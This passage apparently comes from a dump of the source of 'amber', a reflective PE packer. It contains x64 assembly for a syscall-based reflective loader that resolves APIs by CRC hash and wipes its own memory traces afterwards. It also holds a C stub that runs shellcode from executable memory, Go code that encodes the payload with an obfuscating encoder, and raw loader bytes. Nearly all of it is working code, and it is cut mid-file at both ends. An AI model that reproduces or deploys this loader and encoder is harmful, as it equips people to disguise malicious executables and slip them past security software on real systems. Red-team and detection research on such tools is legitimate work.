	lea    rax,[rsp+0x3c]
	mov    QWORD [rsp+0x20],rax
	mov    r8,r14
	mov    rdx,r13
	mov    rcx,0xffffffffffffffff
	mov    r10, 0x6EDE4D41
	call   api_call
	mov    r10,rax        ; <NtProtectVirtualMemory>
	call   syscall_api 
	test   eax,eax
	js     loc_140002e6c 
loc_140002f3d:
	add    esi,0x1
	add    rbx,0x28
	movzx  eax,WORD [rdi+0x6]
	cmp    eax,esi
	jle    loc_140002e73 
loc_140002f50:
	mov    rdx,rbx
	mov    eax,DWORD [rbx+0x24]
	test   eax,eax
	je     loc_140002f3d 
	mov    r9d,eax
	sar    r9d,0x1f
	and    r9d,0xffffffc8
	add    r9d,0x40
	test   eax,0x40000000
	je     loc_140002e9e 
	test   eax,eax
	js     loc_140002ec4 
	test   eax,0x20000000
	jne    loc_140002e8e 
	mov    ecx,0x1
	mov    r9d,0x2
	jmp    loc_140002eda 
```

`loader/syscall-loader-x64/inc/relocate_image.asm`:

```asm
[BITS 64]


relocate_image:
	mov    r9,rcx
	movsxd rdx,DWORD [rcx+0x3c]
	add    rdx,rcx
	mov    eax,DWORD [rdx+0xb0]
	mov    ecx,0x0
	test   eax,eax
	je     loc_14000261a 
	mov    eax,eax
	lea    rcx,[r9+rax*1]
	mov    r10,r9
	sub    r10,QWORD [rdx+0x30]
	cmp    DWORD [rcx],0x0
	jne    loc_140002601 
	mov    ecx,0x1
	jmp    loc_14000261a 
loc_1400025bd:
	mov    edx,DWORD [rcx]
	movzx  r8d,WORD [rax]
	and    r8d,0xfff
	add    rdx,r8
	add    QWORD [r9+rdx*1],r10
loc_1400025d1:
	add    rax,0x2
	mov    edx,DWORD [rcx+0x4]
	add    rdx,rcx
	cmp    rax,rdx
	je     loc_1400025f9 
loc_1400025e0:
	movzx  edx,BYTE [rax+0x1]
	mov    r8d,edx
	and    r8d,0xfffffff0
	cmp    r8b,0xa0
	je     loc_1400025bd 
	cmp    dl,0xf
	jbe    loc_1400025d1 
	jmp    loc_1400025d1 
loc_1400025f9:
	mov    rcx,rax
loc_1400025fc:
	cmp    DWORD [rcx],0x0
	je     loc_140002615 
loc_140002601:
	lea    rax,[rcx+0x8]
	mov    edx,DWORD [rcx+0x4]
	add    rdx,rcx
	cmp    rax,rdx
	jne    loc_1400025e0 
	mov    rcx,rdx
	jmp    loc_1400025fc 
loc_140002615:
	mov    ecx,0x1
loc_14000261a:
	mov    eax,ecx
	ret
```

`loader/syscall-loader-x64/inc/resolve_imports.asm`:

```asm
[BITS 64]


resolve_imports:
	push   r12
	push   rbp
	push   rdi
	push   rsi
	push   rbx
	sub    rsp,0x20
	mov    rbp,rcx
	movsxd rax,DWORD [rcx+0x3c]
	mov    eax,DWORD [rcx+rax*1+0x90]
	mov    edx,0x0
	test   eax,eax
	je     loc_140002966 
	mov    eax,eax
	lea    r12,[rcx+rax*1]
	mov    ecx,DWORD [r12+0xc]
	test   ecx,ecx
	jne    loc_14000292f 
	mov    edx,0x1
	jmp    loc_140002966 
loc_1400028cf:
	mov    edx,0x0
	mov    rcx,rdi
	call   get_proc_by_crc
	test   rax,rax
	je     loc_1400028e4 
	mov    QWORD [rsi],rax
loc_1400028e4:
	add    rbx,0x8
	add    rsi,0x8
	mov    r8,QWORD [rbx]
	test   r8,r8
	je     loc_140002922 
loc_1400028f4:
	test   r8,r8
	js     loc_1400028cf 
	lea    rcx,[rbp+r8*1+0x2]
	mov    edx,0x0
	call   calc_crc
	mov    edx,eax
	mov    r8d,0xffffffff
	mov    rcx,rdi
	call   get_proc_by_crc
	test   rax,rax
	je     loc_1400028e4 
	mov    QWORD [rsi],rax
loc_140002920:
	jmp    loc_1400028e4 
loc_140002922:
	add    r12,0x14
	mov    ecx,DWORD [r12+0xc]
	test   ecx,ecx
	je     loc_14000295a 
loc_14000292f:
	mov    ecx,ecx
	add    rcx,rbp
	call   load_module
	mov    rdi,rax
	test   rax,rax
	je     loc_140002961 
	mov    ebx,DWORD [r12]
	add    rbx,rbp
	mov    esi,DWORD [r12+0x10]
	add    rsi,rbp
	mov    r8,QWORD [rbx]
	test   r8,r8
	jne    loc_1400028f4 
	jmp    loc_140002922 
loc_14000295a:
	mov    edx,0x1
	jmp    loc_140002966 
loc_140002961:
	mov    edx,0x0
loc_140002966:
	mov    eax,edx
	add    rsp,0x20
	pop    rbx
	pop    rsi
	pop    rdi
	pop    rbp
	pop    r12
	ret
```

`loader/syscall-loader-x64/inc/run_tls_callbacks.asm`:

```asm
[BITS 64]


run_tls_callbacks:
	push   rsi
	push   rbx
	sub    rsp,0x28
	mov    rsi,rcx
	movsxd rax,DWORD [rcx+0x3c]
	mov    eax,DWORD [rcx+rax*1+0xd0]
	mov    edx,0x0
	test   eax,eax
	je     loc_1400033ad 
	mov    eax,eax
	mov    rbx,QWORD [rcx+rax*1+0x18]
	mov    edx,0x1
	test   rbx,rbx
	jne    loc_1400033ca 
loc_1400033ad:
	mov    eax,edx
	add    rsp,0x28
	pop    rbx
	pop    rsi
	ret
loc_1400033b6:
	mov    r8d,0x0
	mov    edx,0x1
	mov    rcx,rsi
	call   rax
	add    rbx,0x8
loc_1400033ca:
	mov    rax,QWORD [rbx]
	test   rax,rax
	jne    loc_1400033b6 
	mov    edx,0x1
	jmp    loc_1400033ad 
```

`loader/syscall-loader-x64/stub.c`:

```c
#include <windows.h>
#include "shellcode.h"

int main(int argc, char const *argv[])
{
	char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(BUFFER, shellcode, sizeof(shellcode));
	(*(void(*)())BUFFER)();
	return 0;
}

```

`loader/syscall-loader-x64/syscall-loader-x64.asm`:

```asm
;#==============================================#
;# X64 Reflective Loader                        #
;# Author: Ege Balcı <egebalci@pm.me>           #
;# Version: 3.0                                 #
;#==============================================#
;
[BITS 64]

%define e_lfanew 0x3C
%define _AddressOfEntry 0x28

  call start                                 ; Get the address of PE image to stack
  incbin "putty.exe"                         ; PE file.
start:
	pop rsi                                  ; Get the address of PE to RSI
	push rbp                                 ; Save RBP
	mov rbp,rsp                              ; Create a stack frame
	mov rcx,rsi                              ; Move the image address as first parameter
	call map_image                           ; Perform PE image mapping
	mov rdi, rax                             ; Get the address of mapped PE image into RDI
	mov rcx, rdi                             ; Move a copy of the mapped image address into RCX as first parameter
	call resolve_imports                     ; Resolve image imports
	mov rcx, rdi                             ; Set the mapped image address as first parameter
	call relocate_image                      ; Perform image base relocation
	mov rcx, rdi                             ; Set the mapped image address as first parameter
	call protect_sections                    ; Apply proper section memory protections
	mov rcx, rdi                             ; Set the mapped image address as first parameter
	call run_tls_callbacks                   ; Try to execute TLS callbacks. May fail... ¯\_(ツ)_/¯
	xor rax, rax                             ; Clear out RAX
	mov eax, DWORD [rdi+e_lfanew]            ; Get the file header offset
	mov eax, DWORD [rdi+rax+_AddressOfEntry] ; Get the AddressOfEntry into EAX
	add rax,rdi                              ; Add the AOE onto new image base
	jmp wipe                                 ; Start wiping memory artifacts...
	; ------------------------ FUNCTIONS ------------------------------------
	%include "./inc/memcpy.asm"
	%include "./inc/calc_crc.asm"
	%include "./inc/map_image.asm"
	%include "./inc/load_module.asm"
	%include "./inc/relocate_image.asm"
	%include "./inc/resolve_imports.asm"
	%include "./inc/get_proc_by_crc.asm"
	%include "./inc/get_module_by_crc.asm"
	%include "./inc/protect_sections.asm"
	%include "./inc/run_tls_callbacks.asm"
	%include "../crc32_api/crc32_api_x64.asm"
	%include "../syscall_api/syscall_api.asm"
	;------------------------ FUNCTIONS -------------------------------------
wipe:
	wipe_code_size	equ     wipe_end-(wipe)
	call $+5                          ; Get current EIP to stack
	pop rcx                           ; Pop currect EIP to RCX
	sub rcx,rsi                       ; Calculate the size of the PE file
	add rcx,wipe_code_size            ; Add the size of wipe code 
	mov rdi,rsi                       ; Move the PE address to RDI
	sub rdi,0x5                       ; Go back 5 bytes for wiping the initial call as well
wipe_end:
	rep stosb                         ; Store AL into RDI and decrement RDI until RCX = 0
	; -------------------- SWITCH TO PE ----------------------------
	cld                               ; Clear direction flags
	mov rsp, rbp                      ; Restore stack frame
	pop rbp                           ; Restore RBP
	jmp rax                           ; Jmp to the PE->AOE
```

`main.go`:

```go
package main

import (
	"os"
	"time"

	"github.com/EgeBalci/amber/config"
	amber "github.com/EgeBalci/amber/pkg"
	"github.com/EgeBalci/amber/utils"
	sgn "github.com/EgeBalci/sgn/pkg"
	"github.com/briandowns/spinner"
	"github.com/fatih/color"
)

// Set globals...
var spinr = spinner.New(spinner.CharSets[9], 30*time.Millisecond)

func main() {
	printBanner()
	cfg, err := config.Parse()
	if err != nil {
		utils.PrintFatal(err)
	}

	encoder, err := sgn.NewEncoder(64)
	if err != nil {
		utils.PrintFatal(err)
	}
	encoder.EncodingCount = cfg.EncodeCount
	encoder.ObfuscationLimit = cfg.ObfuscationLimit
	cfg.PrintSummary()
	// ------------------------------
	pe, err := amber.Open(cfg.FileName)
	if err != nil {
		utils.PrintFatal(err)
	}
	pe.SyscallLoader = cfg.UseSyscalls

	if !pe.HasRelocData {
		utils.PrintErr("%s has no relocation data. Exiting...\n", pe.Name)
		return
		// if pe.ImageBase != 0x400000 {
		// 	utils.PrintErr("Can't switch to fixed address loader because ImageBase mismatch!\n")
		// }
		// utils.PrintStatus("Switching to fixed address loader...\n")
	}

	payload, err := pe.AssembleLoader()
	if err != nil {
		utils.PrintFatal(err)
	}

	if encoder.EncodingCount > 0 {
		spinr.Start()
		spinr.Suffix = " Encoding reflective payload..."
		encoder.SetArchitecture(pe.Architecture)
		payload, err = encoder.Encode(payload)
		if err != nil {
			utils.PrintFatal(err)
		}
		spinr.Stop()
	}

	outFile, err := os.Create(cfg.OutputFile)
	if err != nil {
		utils.PrintFatal(err)
	}

	outFile.Write(payload)
	defer outFile.Close()

	finSize, err := utils.GetFileSize(cfg.OutputFile)
	if err != nil {
		utils.PrintFatal(err)
	}
	utils.PrintStatus("Final Size: %d bytes\n", finSize)
	utils.PrintStatus("Output File: %s\n", cfg.OutputFile)
	utils.PrintGreen("[✔] Reflective PE generated !\n")
}

// BANNER .
const BANNER string = `

//       █████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
//      ██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
//      ███████║██╔████╔██║██████╔╝█████╗  ██████╔╝
//      ██╔══██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
//      ██║  ██║██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
//      ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
//  Reflective PE Packer ☣ Copyright (c) 2017 EGE BALCI
//      %s - %s

`

func printBanner() {
	green := color.New(color.FgGreen).Add(color.Bold)
	red := color.New(color.FgRed).Add(color.Bold)
	blue := color.New(color.FgBlue).Add(color.Bold)
	red.Printf(BANNER, green.Sprintf("v%s", config.Version), blue.Sprintf("https://github.com/egebalci/amber"))
}

```

`pkg/amber.go`:

```go
package amber

import (
	"bytes"
	"encoding/binary"
	"errors"
	"path/filepath"

	"github.com/EgeBalci/amber/utils"
	pe "github.com/EgeBalci/debug/pe"
)

const (
	PE_DOS_STUB = "This program cannot be run in DOS mode"
)

var (
	ErrUnsupportedArch  = errors.New("unsupported PE file architecture")
	ErrInvalidPeSpecs   = errors.New("unsupported PE file specs")
	ErrInvalidPeHeaders = errors.New("invalid PE headers")
)

// Blueprint structure contains PE specs, tool parameters and
// OS spesific info
type PE struct {
	Name            string
	FullName        string
	FileSize        int
	IAT             bool
	Resource        bool
	IgnoreIntegrity bool
	IatResolver     bool
	SyscallLoader   bool
	ScrapeHeaders   bool
	// PE specs...
	Architecture      int
	SizeOfImage       uint32
	ImageBase         uint64
	AddressOfEntry    uint32
	Subsystem         uint16
	ImportTable       uint64
	ExportTable       uint64
	RelocTable        uint64
	ImportAdressTable uint64
	HasBoundedImports bool
	HasDelayedImports bool
	HasTLSCallbacks   bool
	HasRelocData      bool
	IsCLR             bool
	IsDLL             bool

	// PE File
	file *pe.File
}

func Open(fileName string) (bp *PE, err error) {
	bp = new(PE)
	bp.Name = fileName
	bp.FullName, err = filepath.Abs(fileName)
	if err != nil {
		return
	}

	bp.file, err = pe.Open(bp.FullName)
	if err != nil {
		return
	}

	switch bp.file.FileHeader.Machine {
	case pe.IMAGE_FILE_MACHINE_I386:
		bp.Architecture = 32
	case pe.IMAGE_FILE_MACHINE_AMD64:
		bp.Architecture = 64
	default:
		return nil, ErrUnsupportedArch
	}

	// Fetch OptionalHeader values to blueprint
	switch hdr := (bp.file.OptionalHeader).(type) {
	case *pe.OptionalHeader32:
		// cast those back to a uint32 before use in 32bit
		bp.ImageBase = uint64(hdr.ImageBase)
		bp.Subsystem = hdr.Subsystem
		bp.SizeOfImage = hdr.SizeOfImage

		bp.IsDLL = bp.file.Characteristics == (bp.file.Characteristics | pe.IMAGE_FILE_DLL)
		bp.HasRelocData = hdr.DataDirectory[5].Size != 0x00
		bp.HasBoundedImports = hdr.DataDirectory[11].Size != 0x00
		bp.HasDelayedImports = hdr.DataDirectory[13].Size != 0x00
		bp.IsCLR = hdr.DataDirectory[14].Size != 0x00

		bp.ExportTable = uint64(hdr.DataDirectory[0].VirtualAddress + uint32(hdr.ImageBase))
		bp.ImportTable = uint64(hdr.DataDirectory[1].VirtualAddress + uint32(hdr.ImageBase))
		bp.RelocTable = uint64(hdr.DataDirectory[5].VirtualAddress + uint32(hdr.ImageBase))
		bp.ImportAdressTable = uint64(hdr.DataDirectory[12].VirtualAddress + uint32(hdr.ImageBase))
	case *pe.OptionalHeader64:
		bp.ImageBase = hdr.ImageBase
		bp.Subsystem = hdr.Subsystem
		bp.SizeOfImage = hdr.SizeOfImage

		bp.IsDLL = bp.file.Characteristics == (bp.file.Characteristics | pe.IMAGE_FILE_DLL)
		bp.HasRelocData = hdr.DataDirectory[5].Size != 0x00
		bp.HasBoundedImports = hdr.DataDirectory[11].Size != 0x00
		bp.HasDelayedImports = hdr.DataDirectory[13].Size != 0x00
		bp.IsCLR = hdr.DataDirectory[14].Size != 0x00

		bp.ExportTable = uint64(hdr.DataDirectory[0].VirtualAddress + uint32(hdr.ImageBase))
		bp.ImportTable = uint64(hdr.DataDirectory[1].VirtualAddress + uint32(hdr.ImageBase))
		bp.RelocTable = uint64(hdr.DataDirectory[5].VirtualAddress + uint32(hdr.ImageBase))
		bp.ImportAdressTable = uint64(hdr.DataDirectory[12].VirtualAddress + uint32(hdr.ImageBase))
	}

	bp.FileSize, err = utils.GetFileSize(bp.FullName)
	return
}

// AssemblePayload generates the binary stub bla bla...
func (pe *PE) AssembleLoader() ([]byte, error) {

	var (
		rawFile = pe.file.RawBytes
		err     error
	)

	if pe.ScrapeHeaders {
		rawFile, err = pe.ScrapePeHeaders()
		if err != nil {
			return nil, err
		}
	}

	// Add a call over the given binary
	payload, err := pe.AddCallOver(rawFile)
	if err != nil {
		return nil, err
	}

	// Decide on the architecture, API block, and loader types...
	// we have 3 pre-assembled loaders for public version of amber.
	switch pe.Architecture {
	case 32:
		if pe.SyscallLoader {
			return nil, errors.New("syscall loader only supports 64 bit PE files")
		}
		payload = append(payload, LOADER_32...)
	case 64:
		if pe.SyscallLoader {
			payload = append(payload, SYSCALL_LOADER_64...)
		} else {
			payload = append(payload, LOADER_64...)
		}

	default:
		return nil, ErrUnsupportedArch
	}

	if pe.IatResolver {
		if pe.SyscallLoader {
			return nil, errors.New("cannot use IAT resolver with syscall loader")
		}
		switch pe.Architecture {
		case 32:
			payload = bytes.ReplaceAll(payload, CRC_API_32, IAT_API_32)
		case 64:
			payload = bytes.ReplaceAll(payload, CRC_API_64, IAT_API_64)
		}
	}

	return payload, nil
}

// AddCallOver function adds a call instruction at the beginning of the given payload
// address of the payload will be pushed to the stack and execution will continue after the end of payload
func (pe *PE) AddCallOver(payload []byte) ([]byte, error) {
	// // Perform a short call over the payload
	size := uint32(len(payload))
	buf := new(bytes.Buffer)
	err := binary.Write(buf, binary.LittleEndian, size)
	if err != nil {
		return nil, err
	}
	return append(append([]byte{0xe8}, buf.Bytes()...), payload...), nil
}

func (pe *PE) ScrapePeHeaders() ([]byte, error) {
	rawFile, err := pe.file.Bytes()
	if err != nil {
		return nil, err
	}

	// Scrape MZ magic bytes...
	if rawFile[0] == 'M' &&
		rawFile[1] == 'Z' {
		rawFile[0] = 0x00
		rawFile[1] = 0x00
	} else {
		return nil, ErrInvalidPeHeaders
	}

	// Scrape the DOS stub message...
	if bytes.Contains(rawFile, []byte(PE_DOS_STUB)) {
		return nil, ErrInvalidPeHeaders
	}

	return bytes.Replace(rawFile, []byte(PE_DOS_STUB), make([]byte, len(PE_DOS_STUB)), 1), nil
}

```

`pkg/static.go`:

```go
package amber

var LOADER_64 = []byte{
	0x5e, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x89, 0xf1, 0xe8, 0x97, 0x00, 0x00,
	0x00, 0x48, 0x89, 0xc7, 0x48, 0x89, 0xf9, 0xe8, 0xdf, 0x02, 0x00, 0x00,
	0x48, 0x89, 0xf9, 0xe8, 0x46, 0x02, 0x00, 0x00, 0x48, 0x89, 0xf9, 0xe8,
	0xf2, 0x05, 0x00, 0x00, 0x48, 0x89, 0xf9, 0xe8, 0x9b, 0x07, 0x00, 0x00,
	0x48, 0x31, 0xc0, 0x8b, 0x47, 0x3c, 0x8b, 0x44, 0x07, 0x28, 0x48, 0x01,
	0xf8, 0xe9, 0x9d, 0x08, 0x00, 0x00, 0x56, 0x57, 0x48, 0x89, 0xcf, 0x48,
	0x89, 0xd6, 0x4c, 0x89, 0xc1, 0xf3, 0xa4, 0x5f, 0x5e, 0xc3, 0x66, 0x85,
	0xd2, 0x74, 0x24, 0x49, 0x89, 0xc8, 0x0f, 0xb7, 0xd2, 0x8d, 0x42, 0xff,
	0x48, 0x8d, 0x54, 0x01, 0x01, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xf2, 0x41,
	0x0f, 0x38, 0xf0, 0x00, 0x49, 0x83, 0xc0, 0x01, 0x49, 0x39, 0xd0, 0x75,
	0xf1, 0xeb, 0x21, 0x0f, 0xb6, 0x11, 0x84, 0xd2, 0x74, 0x1b, 0x48, 0x83,
	0xc1, 0x01, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xf2, 0x0f, 0x38, 0xf0, 0xc2,
	0x48, 0x83, 0xc1, 0x01, 0x0f, 0xb6, 0x51, 0xff, 0x84, 0xd2, 0x75, 0xef,
	0xc3, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xeb, 0xf8, 0x55, 0x57, 0x56, 0x53,
	0x48, 0x83, 0xec, 0x48, 0x48, 0x89, 0xcd, 0x48, 0x63, 0x79, 0x3c, 0x48,
	0x01, 0xcf, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x81, 0x3f, 0x50, 0x45, 0x00,
	0x00, 0x0f, 0x85, 0xa1, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x44, 0x24, 0x38,
	0x00, 0x00, 0x00, 0x00, 0x8b, 0x47, 0x50, 0x48, 0x89, 0x44, 0x24, 0x30,
	0x48, 0x8d, 0x54, 0x24, 0x38, 0xc7, 0x44, 0x24, 0x28, 0x04, 0x00, 0x00,
	0x00, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x30, 0x10, 0x00, 0x4c, 0x8d, 0x4c,
	0x24, 0x30, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc1, 0xff,
	0xff, 0xff, 0xff, 0x41, 0xba, 0x55, 0x7c, 0xce, 0x99, 0xe8, 0x1b, 0x07,
	0x00, 0x00, 0xff, 0xd0, 0x89, 0xc2, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x85,
	0xd2, 0x78, 0x51, 0x44, 0x8b, 0x47, 0x54, 0x48, 0x89, 0xea, 0x48, 0x8b,
	0x4c, 0x24, 0x38, 0xe8, 0x1a, 0xff, 0xff, 0xff, 0x0f, 0xb7, 0x47, 0x14,
	0x48, 0x8d, 0x5c, 0x07, 0x18, 0x66, 0x83, 0x7f, 0x06, 0x00, 0x74, 0x2b,
	0xbe, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x4b, 0x0c, 0x48, 0x03, 0x4c, 0x24,
	0x38, 0x8b, 0x53, 0x14, 0x48, 0x01, 0xea, 0x44, 0x8b, 0x43, 0x10, 0xe8,
	0xee, 0xfe, 0xff, 0xff, 0x83, 0xc6, 0x01, 0x48, 0x83, 0xc3, 0x28, 0x0f,
	0xb7, 0x47, 0x06, 0x39, 0xf0, 0x7f, 0xda, 0x48, 0x8b, 0x44, 0x24, 0x38,
	0x48, 0x83, 0xc4, 0x48, 0x5b, 0x5e, 0x5f, 0x5d, 0xc3, 0x57, 0x48, 0x81,
	0xec, 0x50, 0x02, 0x00, 0x00, 0x49, 0x89, 0xc8, 0x48, 0xc7, 0x84, 0x24,
	0x48, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x84, 0x24, 0x34,
	0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x7c, 0x24, 0x20,
	0xb9, 0x41, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xf3, 0x48,
	0xab, 0x41, 0x80, 0x38, 0x00, 0x0f, 0x84, 0x94, 0x00, 0x00, 0x00, 0xba,
	0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0xd0, 0x48, 0x83, 0xc2, 0x01, 0x41,
	0x80, 0x7c, 0x10, 0xff, 0x00, 0x75, 0xf1, 0x8d, 0x14, 0x00, 0x66, 0x89,
	0x94, 0x24, 0x30, 0x02, 0x00, 0x00, 0x83, 0xc2, 0x02, 0x66, 0x89, 0x94,
	0x24, 0x32, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x89,
	0x94, 0x24, 0x38, 0x02, 0x00, 0x00, 0x83, 0xe8, 0x01, 0x78, 0x15, 0x48,
	0x98, 0x66, 0x41, 0x0f, 0xbe, 0x14, 0x00, 0x66, 0x89, 0x54, 0x44, 0x20,
	0x48, 0x83, 0xe8, 0x01, 0x85, 0xc0, 0x79, 0xed, 0x4c, 0x8d, 0x8c, 0x24,
	0x48, 0x02, 0x00, 0x00, 0x4c, 0x8d, 0x84, 0x24, 0x30, 0x02, 0x00, 0x00,
	0xba, 0x00, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x41, 0xba,
	0xa4, 0xb9, 0xeb, 0xb4, 0xe8, 0x00, 0x06, 0x00, 0x00, 0xff, 0xd0, 0x85,
	0xc0, 0x78, 0x11, 0x48, 0x8b, 0x84, 0x24, 0x48, 0x02, 0x00, 0x00, 0x48,
	0x81, 0xc4, 0x50, 0x02, 0x00, 0x00, 0x5f, 0xc3, 0xb8, 0x00, 0x00, 0x00,
	0x00, 0xeb, 0xf0, 0x66, 0xc7, 0x84, 0x24, 0x30, 0x02, 0x00, 0x00, 0x00,
	0x00, 0x66, 0xc7, 0x84, 0x24, 0x32, 0x02, 0x00, 0x00, 0x02, 0x00, 0x48,
	0x8d, 0x44, 0x24, 0x20, 0x48, 0x89, 0x84, 0x24, 0x38, 0x02, 0x00, 0x00,
	0xeb, 0x9a, 0x49, 0x89, 0xc9, 0x48, 0x63, 0x51, 0x3c, 0x48, 0x01, 0xca,
	0x8b, 0x82, 0xb0, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x85,
	0xc0, 0x74, 0x75, 0x89, 0xc0, 0x49, 0x8d, 0x0c, 0x01, 0x4d, 0x89, 0xca,
	0x4c, 0x2b, 0x52, 0x30, 0x83, 0x39, 0x00, 0x75, 0x4a, 0xb9, 0x01, 0x00,
	0x00, 0x00, 0xeb, 0x5c, 0x8b, 0x11, 0x44, 0x0f, 0xb7, 0x00, 0x41, 0x81,
	0xe0, 0xff, 0x0f, 0x00, 0x00, 0x4c, 0x01, 0xc2, 0x4d, 0x01, 0x14, 0x11,
	0x48, 0x83, 0xc0, 0x02, 0x8b, 0x51, 0x04, 0x48, 0x01, 0xca, 0x48, 0x39,
	0xd0, 0x74, 0x18, 0x0f, 0xb6, 0x50, 0x01, 0x41, 0x89, 0xd0, 0x41, 0x83,
	0xe0, 0xf0, 0x41, 0x80, 0xf8, 0xa0, 0x74, 0xcc, 0x80, 0xfa, 0x0f, 0x76,
	0xdb, 0xeb, 0xd9, 0x48, 0x89, 0xc1, 0x83, 0x39, 0x00, 0x74, 0x14, 0x48,
	0x8d, 0x41, 0x08, 0x8b, 0x51, 0x04, 0x48, 0x01, 0xca, 0x48, 0x39, 0xd0,
	0x75, 0xd1, 0x48, 0x89, 0xd1, 0xeb, 0xe7, 0xb9, 0x01, 0x00, 0x00, 0x00,
	0x89, 0xc8, 0xc3, 0x41, 0x54, 0x55, 0x57, 0x56, 0x53, 0x48, 0x83, 0xec,
	0x20, 0x48, 0x89, 0xcd, 0x48, 0x63, 0x41, 0x3c, 0x8b, 0x84, 0x01, 0x90,
	0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84,
	0xb0, 0x00, 0x00, 0x00, 0x89, 0xc0, 0x4c, 0x8d, 0x24, 0x01, 0x41, 0x8b,
	0x4c, 0x24, 0x0c, 0x85, 0xc9, 0x75, 0x6a, 0xba, 0x01, 0x00, 0x00, 0x00,
	0xe9, 0x97, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89,
	0xf9, 0xe8, 0x97, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x03, 0x48,
	0x89, 0x06, 0x48, 0x83, 0xc3, 0x08, 0x48, 0x83, 0xc6, 0x08, 0x4c, 0x8b,
	0x03, 0x4d, 0x85, 0xc0, 0x74, 0x2e, 0x4d, 0x85, 0xc0, 0x78, 0xd6, 0x4a,
	0x8d, 0x4c, 0x05, 0x02, 0xba, 0x00, 0x00, 0x00, 0x00, 0xe8, 0xe4, 0xfc,
	0xff, 0xff, 0x89, 0xc2, 0x41, 0xb8, 0xff, 0xff, 0xff, 0xff, 0x48, 0x89,
	0xf9, 0xe8, 0x5b, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0xc7, 0x48,
	0x89, 0x06, 0xeb, 0xc2, 0x49, 0x83, 0xc4, 0x14, 0x41, 0x8b, 0x4c, 0x24,
	0x0c, 0x85, 0xc9, 0x74, 0x2b, 0x89, 0xc9, 0x48, 0x01, 0xe9, 0xe8, 0xd2,
	0xfd, 0xff, 0xff, 0x48, 0x89, 0xc7, 0x48, 0x85, 0xc0, 0x74, 0x20, 0x41,
	0x8b, 0x1c, 0x24, 0x48, 0x01, 0xeb, 0x41, 0x8b, 0x74, 0x24, 0x10, 0x48,
	0x01, 0xee, 0x4c, 0x8b, 0x03, 0x4d, 0x85, 0xc0, 0x75, 0x9c, 0xeb, 0xc8,
	0xba, 0x01, 0x00, 0x00, 0x00, 0xeb, 0x05, 0xba, 0x00, 0x00, 0x00, 0x00,
	0x89, 0xd0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c,
	0xc3, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x55, 0x57, 0x56,
	0x53, 0x48, 0x81, 0xec, 0x58, 0x02, 0x00, 0x00, 0x48, 0x89, 0xcb, 0x41,
	0x89, 0xd5, 0x44, 0x89, 0xc5, 0x48, 0x63, 0x41, 0x3c, 0x48, 0x01, 0xc8,
	0x8b, 0xb0, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xce, 0x8b, 0x80, 0x8c,
	0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x2c, 0x44, 0x8b, 0x66, 0x20, 0x44,
	0x8b, 0x76, 0x1c, 0x44, 0x8b, 0x7e, 0x24, 0x8b, 0x46, 0x18, 0x85, 0xc0,
	0x0f, 0x84, 0x97, 0x01, 0x00, 0x00, 0x89, 0xc0, 0x48, 0x89, 0x44, 0x24,
	0x20, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x49, 0x01, 0xcc, 0x41, 0x8b, 0x0c,
	0xbc, 0x48, 0x01, 0xd9, 0xba, 0x00, 0x00, 0x00, 0x00, 0xe8, 0x0c, 0xfc,
	0xff, 0xff, 0x39, 0xfd, 0x74, 0x1a, 0x44, 0x39, 0xe8, 0x74, 0x15, 0x48,
	0x83, 0xc7, 0x01, 0x48, 0x39, 0x7c, 0x24, 0x20, 0x75, 0xdb, 0xb8, 0x00,
	0x00, 0x00, 0x00, 0xe9, 0x2d, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x04, 0x7b,
	0x42, 0x0f, 0xb7, 0x04, 0x38, 0x48, 0x8d, 0x04, 0x83, 0x42, 0x8b, 0x04,
	0x30, 0x48, 0x01, 0xc3, 0x48, 0x39, 0xf3, 0x0f, 0x82, 0x0d, 0x01, 0x00,
	0x00, 0x8b, 0x44, 0x24, 0x2c, 0x48, 0x01, 0xc6, 0x48, 0x39, 0xf3, 0x0f,
	0x83, 0xfd, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x44, 0x24, 0x30, 0x00, 0x00,
	0x00, 0x00, 0x48, 0xc7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0x48,
	0x8d, 0x7c, 0x24, 0x40, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xb9, 0x1e, 0x00,
